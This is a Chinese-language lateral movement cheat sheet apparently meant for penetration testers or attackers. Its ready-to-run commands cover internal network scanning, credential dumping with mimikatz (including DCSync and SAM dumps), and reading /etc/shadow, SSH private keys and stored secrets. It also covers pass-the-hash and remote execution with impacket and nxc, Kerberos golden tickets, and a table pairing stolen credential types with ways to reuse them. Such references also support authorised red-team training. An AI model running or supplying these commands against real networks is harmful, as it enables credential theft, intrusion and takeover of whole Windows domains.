# 横向移动速查

> 横向移动的核心：`凭据复用 + 通道打通 + 远程执行`。

## 五步流程

```text
① 建立代理/隧道
→ ② 扫描内网
→ ③ 收集密码/Hash/票据
→ ④ 认证复用
→ ⑤ 远程执行
```

## 1. 本机线索与文件传输

```bash
ip a
ip route
arp -a
cat /etc/hosts
netstat -antp
ss -lntp

scp ./file user@target:/tmp/file
scp user@target:/tmp/file ./file
```

## 2. 内网扫描

```bash
fping -a -g 172.16.200.0/24
nmap -sn 172.16.200.0/24
nmap -sV -Pn 172.16.200.0/24
nmap -sS -p 22,80,445,1433,3306,3389,6379 172.16.200.0/24
```

## 3. 抓凭据

Windows：

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::dcsync /user:Administrator
```

Linux：

```bash
cat /etc/shadow
cat ~/.bash_history
cat ~/.ssh/id_rsa
grep -RniE 'password|passwd|secret|token|api_key|access_key' /var/www /opt /home 2>/dev/null
```

## 4. 认证复用

明文密码：

```bash
nxc smb 192.168.1.10 -u user -p 'password'
ssh user@192.168.1.10
xfreerdp /u:user /p:'password' /v:192.168.1.10
```

NTLM Hash / Pass-the-Hash：

```bash
impacket-wmiexec administrator@192.168.1.10 -hashes :<NTLM>
impacket-psexec administrator@192.168.1.10 -hashes :<NTLM>
impacket-smbexec administrator@192.168.1.10 -hashes :<NTLM>
nxc smb 192.168.1.10 -u administrator -H <NTLM> -x 'whoami'
```

票据：

```text
Rubeus.exe asktgt /user:user /rc4:<hash> /ptt
kerberos::golden /user:administrator /domain:domain.local /sid:<SID> /krbtgt:<hash> /ptt
```

## 5. 远程执行

```bash
impacket-wmiexec user@target -hashes :<hash>
impacket-psexec user@target -hashes :<hash>
nxc smb target -u user -p pass -x 'whoami'
nxc winrm target -u user -p pass -x 'whoami'
```

## 凭据复用表

| 拿到的东西 | 优先尝试 |
|---|---|
| 明文密码 | SMB / SSH / RDP / 数据库 / 后台 |
| NTLM Hash | PtH、WMI、PsExec、SMB |
| 机器账户 Hash | 白银票据、S4U2Self |
| `krbtgt` Hash | 黄金票据、DCSync |
| SSH 私钥 | 直接 SSH 登录 |
| 数据库密码 | 数据库横向、密码复用 |
| Token / AK/SK | 云 API、对象存储 |

## 代理

```bash
proxychains4 nmap -sT -Pn 172.16.200.0/24

```
